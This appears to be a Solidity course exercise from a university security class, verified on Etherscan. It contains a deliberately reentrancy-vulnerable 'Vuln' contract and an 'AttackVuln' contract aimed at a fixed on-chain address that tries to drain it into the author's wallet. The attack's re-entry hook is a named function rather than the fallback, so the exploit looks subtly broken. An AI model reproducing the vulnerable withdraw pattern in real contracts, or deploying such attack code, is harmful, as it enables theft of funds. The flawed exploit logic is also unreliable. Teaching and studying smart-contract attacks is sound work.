/**
 *Submitted for verification at Etherscan.io on 2022-12-08
*/

pragma solidity ^0.5.17;

// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
// SPDX-License-Identifier: WTFPL
//
// Happy hacking, and play nice! :)
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract AttackVuln {
    Vuln target = Vuln(address(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d));
    uint amountinmin;
    bool count;

    constructor () public{  //initialize variables
        amountinmin = 0.00001 ether;
        count = false;
    }

    address payable me = address(0x20759B4F85DDAC60B0BBBE239FB2Bc03249d93E6); //it's me

    function deposit1() public payable{  //deposits, requires min amount of 0.00001 ether
        require(msg.value >= amountinmin);
        target.deposit.value(msg.value)();
    }
    function withdraw1() public payable{  //first withdraw
        target.withdraw();
    }

    function morepay() external payable{  //stealing time >:)
        me.transfer(msg.value);
        if(!count){
            count = true;
            target.withdraw();
        }
        //count = false;
    }
}